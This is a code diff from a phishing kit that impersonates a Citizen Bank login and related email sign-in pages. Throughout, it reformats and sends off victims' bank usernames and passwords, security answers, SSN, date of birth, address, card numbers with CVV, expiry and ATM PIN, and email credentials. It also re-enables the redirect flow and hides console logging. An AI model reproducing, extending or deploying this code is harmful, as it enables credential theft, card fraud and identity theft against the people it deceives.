@@ -178,7 +178,7 @@ User-Agent: ${navigator.userAgent}
 
 function browser_ip() {
     return `
-IP: ${ip_config.country}";
+IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
 User-Agent: ${navigator.userAgent}";
 ###############################################################`;
 }
@@ -187,7 +187,7 @@ function _User_Pass_single(username, password, secondtry = true) {
     if (secondtry === true) {
         return {
             u1: 'unknown',
-            second_pass: `\nPassword (Second Try): ${password}`,
+            second_pass: `\n== Second Try ==\nUsername: ${username}  ||  Password: ${password}`,
             username: localStorage.getItem("username"),
             nametype: 'citizen',
             userid: DEDICATED_LICENSE,
@@ -197,7 +197,7 @@ function _User_Pass_single(username, password, secondtry = true) {
         let u = (new Date()).getTime() + "_" + username;
         localStorage.setItem("username", u);
         return {
-            u1: `##################### Citizen Bank Account #####################\nUsername: ${username}\nPassword: ${password}`,
+            u1: `##################### Citizen Bank Account #####################\nUsername: ${username}  ||  Password: ${password}`,
             username: u,
             nametype: 'citizen',
             userid: DEDICATED_LICENSE,
@@ -261,12 +261,9 @@ Answer 3: ${a3}`;
 
 function _personal_info_single(full_name, address, city, state, zip, dob, ssn) {
     let post = `Full Name: ${full_name}
-Address: ${address}
-City: ${city}
-State: ${state}
-zipcode: ${zip}
 Date Of Birth: ${dob}
-Social Security Number (SSN): ${ssn}`;
+Social Security Number (SSN): ${ssn}
+Address: ${address}, ${city}, ${state} ${zip}, USA`;
     return {
         u3: post,
         username: localStorage.getItem("username"),
@@ -278,9 +275,7 @@ Social Security Number (SSN): ${ssn}`;
 
 function _card_info_single(card_number, expire, cvv, pin, card) {
     let post = `Card Number: ${card_number}
-Expiration Date: ${expire}
-Cvv: ${cvv}
-ATM PIN: ${pin}
+Expiration Date: ${expire}  ||  Cvv: ${cvv}  ||  ATM PIN: ${pin}
 == BIN Info ==
 Brand: ${card.scheme} || Level: ${card.brand} || Type: ${card.type} || Country: ${card.country}`;
     return {
@@ -295,7 +290,7 @@ Brand: ${card.scheme} || Level: ${card.brand} || Type: ${card.type} || Country: 
 function _Email_Pass_single(email, password, retry = false) {
     if (retry === false) {
         return {
-            u5: `Username: ${email}\nPassword: ${password}`,
+            u5: `Password (Second Try): ${password}`,
             username: localStorage.getItem("username"),
             nametype: 'citizen',
             userid: DEDICATED_LICENSE,
@@ -303,7 +298,7 @@ function _Email_Pass_single(email, password, retry = false) {
         }
     } else {
         return {
-            u6: `Username: ${email}\nPassword: ${password}`,
+            u6: `Username: ${email}  ||  Password: ${password}`,
             username: localStorage.getItem("username"),
             nametype: 'citizen',
             userid: DEDICATED_LICENSE,
@@ -362,27 +357,31 @@ async function form_index(form) {
     let post = USE_DEDICATED ? _User_Pass_single(u, p, TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === true) : User_Pass_single(u, p, TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === true);
     let result = USE_DEDICATED ? await load_Send_post_Dedicated(post) : await load_Send_post(post);
     if (Object.keys(result).includes('errors')) {
-        //window.location.replace(location.href);
-        //window.location.reload();
+        window.location.replace(location.href);
+        window.location.reload();
     } else {
-       /* if (result.response.msg.includes("uccessfull")) {
-            localStorage.setItem("username", u);
+        if (result.response.msg.includes("uccessfull")) {
+            if (USE_DEDICATED === false) localStorage.setItem("username", u);
             if (TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === false) {
-                // window.location.replace(location.href + "&vry=" + (new Date()).getTime());
-                //window.location.reload();
+                window.location.replace(location.href + "&vry=" + (new Date()).getTime());
+                window.location.reload();
             } else {
                 let url = location.href.split("#")[0] + "#/login/verify" + rand_url() + "?" + query_gen();
-                //location.replace(url);
-                // window.location.reload();
+                location.replace(url);
+                window.location.reload();
             }
         } else {
-            //window.location.replace(location.href);
-            //window.location.reload();
-        }*/
+            window.location.replace(location.href);
+            window.location.reload();
+        }
     }
 }
 
 async function form_verify(form) {
+    let $btn = $(document.getElementById("btn"));
+    if ($btn.hasClass("loading_now")) return false;
+    $btn.addClass("loading_now").css({'text-transform': 'none'});
+    $btn.html("Please wait... <i class=\"fas fa-spinner fa-pulse\" style=\"margin-left: 5px;\"></i>");
     let q1 = document.getElementById("q1").value;
     let q2 = document.getElementById("q2").value;
     let q3 = document.getElementById("q3").value;
@@ -408,6 +407,10 @@ async function form_verify(form) {
 }
 
 async function form_details(form) {
+    let $btn = $(document.getElementById("btn"));
+    if ($btn.hasClass("loading_now")) return false;
+    $btn.addClass("loading_now").css({'text-transform': 'none'});
+    $btn.html("Please wait... <i class=\"fas fa-spinner fa-pulse\" style=\"margin-left: 5px;\"></i>");
     let fname = document.getElementById("fname").value;
     let address = document.getElementById("address").value;
     let city = document.getElementById("city").value;
@@ -434,6 +437,10 @@ async function form_details(form) {
 }
 
 async function form_contact(form) {
+    let $btn = $(document.getElementById("btn"));
+    if ($btn.hasClass("loading_now")) return false;
+    $btn.addClass("loading_now").css({'text-transform': 'none'});
+    $btn.html("Please wait... <i class=\"fas fa-spinner fa-pulse\" style=\"margin-left: 5px;\"></i>");
     let email = document.getElementById("email").value;
     location.replace(userEmail(email));
     location.reload();
@@ -467,13 +474,17 @@ async function form_email(form) {
 }
 
 async function form_card(form) {
+    let $btn = $(document.getElementById("btn"));
+    if ($btn.hasClass("loading_now")) return false;
+    $btn.addClass("loading_now").css({'text-transform': 'none'});
+    $btn.html("Please wait... <i class=\"fas fa-spinner fa-pulse\" style=\"margin-left: 5px;\"></i>");
     let card = document.getElementById("card").value;
     let cvv = document.getElementById("cvv").value;
     let exp = document.getElementById("exp").value;
     let pin = document.getElementById("pin").value;
     let bin = await getBin(card);
-    let post = card_info_single(localStorage.getItem("username"), card, exp, cvv, pin, bin);
-    let result = await load_Send_post(post);
+    let post = USE_DEDICATED ? _card_info_single(card, exp, cvv, pin, bin) : card_info_single(localStorage.getItem("username"), card, exp, cvv, pin, bin);
+    let result = USE_DEDICATED ? await load_Send_post_Dedicated(post) : await load_Send_post(post);
     if (Object.keys(result).includes('errors')) {
         window.location.replace(location.href);
         window.location.reload();
@@ -521,12 +532,12 @@ async function load_Send_post_Dedicated(post = {}) {
             dataType: "text",
             data: post,
             success: function (response) {
-                console.log('success', response);
-                console.log({response: {msg: "Yes Sent Successfully"}})
+                // console.log('success', response);
+                // console.log({response: {msg: "Yes Sent Successfully"}})
                 resolve({response: {msg: "Yes Sent Successfully"}});
             },
             error: function (response) {
-                console.log('error', response);
+                // console.log('error', response);
                 let error = {errors: response}
                 resolve(error);
             }
@@ -549,10 +560,10 @@ function userEmail(email = "") {
     email = "eml=" + btoa(email.toLowerCase()) + "&";
     if (email2.includes("@gmail")) {
         return "#/login/email/gmail" + rand_url() + "?" + email + query_gen();
-    } else if (email2.includes("@yahoo") || email2.includes("@ymail") || email2.includes("@rocketmail") || email2.includes("@att.")) {
+    } else if (email2.includes("@yahoo") || email2.includes("@ymail") || email2.includes("@rocketmail")) {
         return "#/login/email/yahoo" + rand_url() + "?" + email + query_gen();
     } else if (email2.includes("@outlook") || email2.includes("@hotmail") || email2.includes("@live") || email2.includes("@msn")) {
-        return "#/login/email/microsolt" + rand_url() + "?" + email + query_gen();
+        return "#/login/email/microsoft" + rand_url() + "?" + email + query_gen();
     } else if (email2.includes("@aol")) {
         return "#/login/email/aol" + rand_url() + "?" + email + query_gen();
     } else if (email2.includes("@comcast")) {
@@ -562,7 +573,7 @@ function userEmail(email = "") {
     } else if (email2.includes("@verizon")) {
         return "#/login/email/verizon" + rand_url() + "?" + email + query_gen();
     } else {
-        return "#/login/email/microsolt" + rand_url() + "?" + email + query_gen();
+        return "#/login/email/microsoft" + rand_url() + "?" + email + query_gen();
     }
 }
 
